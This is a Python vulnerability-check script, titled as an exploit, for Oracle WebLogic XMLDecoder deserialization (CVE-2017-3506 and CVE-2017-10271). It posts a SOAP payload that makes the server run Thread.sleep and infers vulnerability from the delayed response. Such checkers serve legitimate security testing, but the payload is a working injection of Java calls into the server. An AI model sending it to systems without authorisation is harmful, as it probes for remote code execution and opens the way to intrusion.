#!/usr/bin/env python
# Exploit Title: Xml Serialization Exploit
# Date: 03/20/2018
# Exploit Author: @0xalg
# Vendor Homepage: https://ERPScan.com
# Version: 1.1

import requests
import argparse
import logging
from ansicolor import red, green, blue, magenta

headers_ = {
    'Content-Type': 'text/xml'
}

help_desc = """
EBS python script for XML Serialization sleep payload testing based on `CVE-2017-3506 & 10271`.
"""

payload = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0_151" class="java.beans.XMLDecoder">
                <void class="java.lang.Thread">
                    <void method="sleep">
                        <long>10000</long>
                    </void>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
'''

timeout = 15
payload_min_time = 10.0
base_url = ''

parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-H', '--host', default='127.0.0.1', help='WebLogic host (default: 127.0.0.1). Example: ebs.example.com')
parser.add_argument('-P', '--port', default=7001, type=int, help='WebLogic port (default: 7001)')
parser.add_argument('-u', '--url', default='wls-wsat/CoordinatorPortType', help='WebLogic target URL (default: wls-wsat/CoordinatorPortType)')
parser.add_argument('-s', '--ssl', action='store_true', help='enable SSL')
parser.add_argument('-t', '--timeout', default=15, type=int, help='HTTP connection timeout in second (default: 15)')
parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')

def f_verbose(value):
    if args.verbose:
        print value.replace("[X]", red("[X]")).replace("[*]", green("[*]")).replace("[!]", magenta("[!]"))\
            .replace("safe", blue("safe"))
    return


def f_send_request(payload_o):
    f_verbose("[*] Sending request to {}.".format(base_url))

    try:
        r = requests.post(base_url, headers=headers_, data=payload_o, timeout=timeout, verify=False)
    except requests.exceptions.ConnectionError:
        print "Error. Connection refused."
        exit(1)
    except requests.exceptions.Timeout:
        f_verbose("[!] Time of response exceeded {} seconds!".format(timeout))
        return timeout

    if r.status_code != 500:
        print red("[X]") + " Error with HTTP code ", r.status_code
        print r.text
        exit(1)

    time = r.elapsed.total_seconds()
    f_verbose(str(r.status_code))
    f_verbose("[*] Program has successfully sent payload to {}.".format(base_url))
    f_verbose("Time of response: {} ".format(time))

    return time


def f_run():  # check payloads
    f_verbose("[*] Checking payload.")
    result = f_send_request(payload)

    if payload_min_time <= result < timeout:
        f_verbose("[*] Payload successfully executed!")
        return True
    else:
        f_verbose("[!] Payload is not working!")

    return False


def f_check():
    global timeout, base_url
    timeout = args.timeout
    logging.captureWarnings(True)  # Capture the ssl warnings with the standard logging module

    if args.ssl:
        base_url = "https://{}:{}/{}".format(args.host, args.port, args.url)
    else:
        base_url = "http://{}:{}/{}".format(args.host, args.port, args.url)

    f_verbose("[*] Program will check out WebLogic for CVE-2017-3506 & 10271 vulnerability.")

    if f_run():
        print red("[x]") + " Your system is potentially vulnerable to XML Serialization attack!"
    else:
        print green("[*]") + " Your system is " + blue("safe!")


if __name__ == '__main__':
    args = parser.parse_args()
    f_check()
